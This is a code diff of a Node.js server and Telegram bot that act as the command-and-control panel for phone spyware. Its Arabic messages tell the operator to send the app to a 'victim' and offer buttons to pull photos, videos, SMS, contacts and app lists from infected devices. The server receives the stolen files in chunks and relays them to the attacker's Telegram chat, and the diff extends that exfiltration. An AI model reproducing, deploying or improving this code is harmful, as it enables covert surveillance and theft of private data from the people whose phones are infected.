@@ -3,14 +3,12 @@ require('dotenv').config();
 const express = require('express');
 const telegramBot = require('node-telegram-bot-api');
 const crypto = require('crypto');
-const zlib = require('zlib');
 const fs = require('fs');
 const path = require('path');
 const sqlite3 = require('sqlite3').verbose();
 
 const token = process.env.TG_TOKEN;
 const chatId = process.env.TG_ID;
-const MASTER_SECRET = process.env.AGENT_SECRET || 'BlackActivationMasterKey2026';
 
 if (!token || !chatId) {
     console.error('[-] Critical Error: Telegram credentials missing.');
@@ -23,7 +21,6 @@ const TEMP_DIR = path.join(__dirname, 'unified_temp');
 
 const db = new sqlite3.Database('./unified_core.db');
 db.serialize(() => {
-    db.run(`CREATE TABLE IF NOT EXISTS nonces (nonce TEXT PRIMARY KEY, timestamp INTEGER)`);
     db.run(`CREATE TABLE IF NOT EXISTS nodes (id TEXT PRIMARY KEY, model TEXT, last_seen INTEGER)`);
     db.run(`CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT, payload TEXT, status TEXT)`);
 });
@@ -39,7 +36,6 @@ appBot.on('polling_error', (error) => {
 
 app.use(express.text({ type: '*/*', limit: '500mb' }));
 
-const CRYPTO_KEY = crypto.createHash('sha256').update(Buffer.from(MASTER_SECRET, 'utf8')).digest();
 const activeLocks = new Map();
 
 async function sendTg(msg, options = {}) {
@@ -63,23 +59,15 @@ app.post('/api/v3/unified/stream', async (req, res) => {
         
         let payload;
         try {
-            const rawBody = req.body;
-            // التحقق مما إذا كانت البيانات مبدئية بصيغة JSON مباشرة أو مقفرة بـ base64
-            if (rawBody.trim().startsWith('{')) {
-                payload = JSON.parse(rawBody);
-            } else {
-                const packet = JSON.parse(Buffer.from(rawBody, 'base64').toString('utf8'));
-                payload = packet;
-            }
+            payload = JSON.parse(req.body);
         } catch (err) {
-            return res.status(400).json({ status: 'BAD_PAYLOAD' });
+            return res.status(400).json({ status: 'BAD_PAYLOAD', error: err.message });
         }
 
         let directive = { status: 'ACK', task: null };
 
         if (payload.type === 'TEXT_REPORT') {
-            await sendTg(`📋 <b>تقرير من [<code>${nodeId}</code>]:</b>
-<pre>${(payload.data || '').substring(0, 3500)}</pre>`);
+            await sendTg(`📋 <b>تقرير مباشر من [<code>${nodeId}</code>]:</b>\n<pre>${(payload.data || '').substring(0, 3500)}</pre>`);
         } else if (payload.type === 'MEDIA_CHUNK') {
             const { uploadId, fileName, chunkIndex, totalChunks, isLast, data, fileHash } = payload;
             const tempPath = path.join(TEMP_DIR, `${nodeId}_${uploadId}.tmp`);
@@ -98,10 +86,24 @@ app.post('/api/v3/unified/stream', async (req, res) => {
                     if (fileHash && calcHash !== fileHash) {
                         await sendTg(`⚠️ <b>تحذير: تطابق الـ Hash فشل للملف ${safeName}</b>`);
                     } else {
-                        await appBot.sendDocument(chatId, finalPath, { caption: `🔥 <b>تم سحب الملف بنجاح!</b>
-📱 العقدة: <code>${nodeId}</code>` });
+                        const stats = fs.statSync(finalPath);
+                        const fileSizeMB = stats.size / (1024 * 1024);
+                        if (fileSizeMB > 50) {
+                            await sendTg(`⚠️ <b>الملف كبير جداً (${fileSizeMB.toFixed(2)} MB):</b> ${safeName} يتجاوز الحد الأقصى لتيليجرام (50MB).`);
+                        } else {
+                            const ext = path.extname(safeName).toLowerCase();
+                            if (['.jpg', '.jpeg', '.png', '.webp'].includes(ext)) {
+                                await appBot.sendPhoto(chatId, finalPath, { caption: `📸 <b>صورة حقيقية مسحوبة!</b>\n📱 العقدة: <code>${nodeId}</code>\n📂 الملف: <code>${safeName}</code>` });
+                            } else if (['.mp4', '.mkv', '.avi', '.mov'].includes(ext)) {
+                                await appBot.sendVideo(chatId, finalPath, { caption: `🎥 <b>فيديو حقيقي مسحوب!</b>\n📱 العقدة: <code>${nodeId}</code>\n📂 الملف: <code>${safeName}</code>` });
+                            } else {
+                                await appBot.sendDocument(chatId, finalPath, { caption: `🔥 <b>ملف حقيقي مسحوب!</b>\n📱 العقدة: <code>${nodeId}</code>\n📂 الملف: <code>${safeName}</code>` });
+                            }
+                        }
                     }
                 }
+            } catch (chunkErr) {
+                await sendTg(`❌ <b>خطأ في معالجة الوسائط (${fileName}):</b> ${chunkErr.message}`);
             } finally {
                 activeLocks.delete(uploadId);
             }
@@ -115,7 +117,7 @@ app.post('/api/v3/unified/stream', async (req, res) => {
             res.status(200).json(directive);
         });
     } catch (e) {
-        res.status(500).json({ status: 'SERVER_ERROR' });
+        res.status(500).json({ status: 'SERVER_ERROR', message: e.message });
     }
 });
 
@@ -126,7 +128,7 @@ appBot.on('message', async (msg) => {
     if (text === '/start') {
         db.all(`SELECT id, model, last_seen FROM nodes`, async (err, rows) => {
             if (!rows || rows.length === 0) {
-                await sendTg(`⚠️ <b>لا توجد عقد متصلة حالياً.</b>`);
+                await sendTg(`⚠️ <b>لا توجد عقد متصلة حالياً. أرسل التطبيق للضحية لتبدأ السيطرة.</b>`);
                 return;
             }
 
@@ -135,8 +137,7 @@ appBot.on('message', async (msg) => {
                 inlineKeyboard.push([{ text: `📱 ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
             });
 
-            await sendTg(`🔥 <b>لوحة القيادة والسيطرة الموحدة:</b>
-اختر العقدة المستهدفة:`, {
+            await sendTg(`🔥 <b>لوحة القيادة والسيطرة الموحدة الحقيقية:</b>\nاختر العقدة المستهدفة للسيطرة الفورية:`, {
                 reply_markup: { inline_keyboard: inlineKeyboard }
             });
         });
@@ -152,8 +153,8 @@ appBot.on('callback_query', async (query) => {
         const keyboard = {
             inline_keyboard: [
                 [
-                    { text: '📸 سحب الصور', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` },
-                    { text: '🎥 سحب الفيديوهات', callback_data: `cmd_EXTRACT_VIDEOS_${nodeId}` }
+                    { text: '📸 سحب الصور الحقيقية', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` },
+                    { text: '🎥 سحب الفيديوهات الحقيقية', callback_data: `cmd_EXTRACT_VIDEOS_${nodeId}` }
                 ],
                 [
                     { text: '📨 سحب الرسائل', callback_data: `cmd_EXTRACT_SMS_${nodeId}` },
@@ -163,10 +164,10 @@ appBot.on('callback_query', async (query) => {
                     { text: '📇 جهات الاتصال', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` },
                     { text: '📱 التطبيقات', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }
                 ],
-                [{ text: '🔙 عودة', callback_data: 'back_home' }]
+                [{ text: '🔙 عودة للقائمة الرئيسية', callback_data: 'back_home' }]
             ]
         };
-        await appBot.editMessageText(`🎯 <b>العقدة المحددة:</b> <code>${nodeId}</code>`, {
+        await appBot.editMessageText(`🎯 <b>العقدة المحددة للسيطرة:</b> <code>${nodeId}</code>`, {
             chat_id: msg.chat.id,
             message_id: msg.message_id,
             parse_mode: 'HTML',
@@ -178,12 +179,12 @@ appBot.on('callback_query', async (query) => {
         const nodeId = parts[3];
 
         db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [nodeId, action], async () => {
-            await appBot.answerCallbackQuery(query.id, { text: `🚀 تم الحقن بنجاح!` });
+            await appBot.answerCallbackQuery(query.id, { text: `🚀 تم حقن الأمر بنجاح!` });
             await sendTg(`⚡ <b>أمر [<code>${action}</code>] قيد التنفيذ للعقدة <code>${nodeId}</code>...</b>`);
         });
     } else if (data === 'back_home') {
         await appBot.deleteMessage(msg.chat.id, msg.message_id);
-        await sendTg(`أرسل <code>/start</code> لإظهار القائمة.`);
+        await sendTg(`أرسل <code>/start</code> لإظهار قائمة العقد النشطة.`);
     }
 });
 
